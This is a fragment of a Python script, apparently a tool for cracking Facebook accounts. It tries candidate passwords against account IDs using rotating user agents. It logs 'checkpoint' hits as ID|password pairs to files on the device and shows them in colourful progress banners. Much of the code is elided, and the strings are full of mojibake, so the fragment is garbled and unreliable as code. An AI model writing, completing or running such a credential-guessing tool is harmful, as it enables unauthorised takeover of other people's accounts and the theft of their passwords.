	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:lin = open('OK/'+geh,'r').read().splitlines()
				...
				back()
			noOK=0
			for OKku in range(len(lin)):
				OKkuni=lin[noOK].split('|')
				OKkuh=f'# ID : {OKkuni[0]} PASSWORD : {OKkuni[1]}'
				sol().print(mark(OKkuh,style="green"))
				noOK +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
...
def passwrd():
	...
	print(f'=>RESULTS {k}OK{h} CHEK : {k}OK/%s {b}'%(OKc))
	...
	print(f'{k}[{k}Ã¢â‚¬Â¢{h}]{k} OK : {k}%s{u} '%(OK))
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}RAFU-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{OK}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,OK
	sys.stdout.write(f"\rÃ¢ÂÂ¤Ã¯Â¸Â {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{OK}{x}]Ã¢â‚¬â€[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s Ã¢ËœÂ¬ %s/%s Ã¢ËœÂ¬ OK:%s Ã¢ËœÂ¬ OK:%s Ã¢ËœÂ¬ %s%s%s Ã¢ËœÂ¬'%(bi,loop,len(id2),ok,OK,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statusOK = f'[Ã¢â‚¬Â¢] ID       : {idf} [Ã¢â‚¬Â¢] PASSWORD : {pw}'
					statusOK1 = nel(statusOK, style='red')
					cetak(nel(statusOK1, title='Ilham-Rd OK'))
					open('/sdcard/PINK-DATA/OK/'+OKc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					OK+=1
				else:continue
				break
